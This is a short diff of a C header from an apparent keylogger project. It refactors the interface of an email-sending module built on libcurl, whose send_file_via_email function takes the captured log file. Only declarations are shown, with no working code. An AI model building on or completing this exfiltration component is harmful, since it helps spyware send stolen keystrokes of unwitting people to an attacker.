@@ -1,7 +1,7 @@
-#ifndef Keylogger_SendEmail_H_SENTRY
-#define Keylogger_SendEmail_H_SENTRY
+#pragma once
 
 #include <curl/curl.h>
+#include "keylogger/utils/log_file.h"
 
 typedef struct {
     CURL *curl;
@@ -9,7 +9,5 @@ typedef struct {
 } EmailSender;
 
 int EmailSender_init(EmailSender *sender);
-int send_file_via_email(EmailSender *sender, FileHandler *fh);
+int send_file_via_email(EmailSender *sender, Logfile *fh);
 void EmailSender_cleanup(EmailSender *sender);
-
-#endif
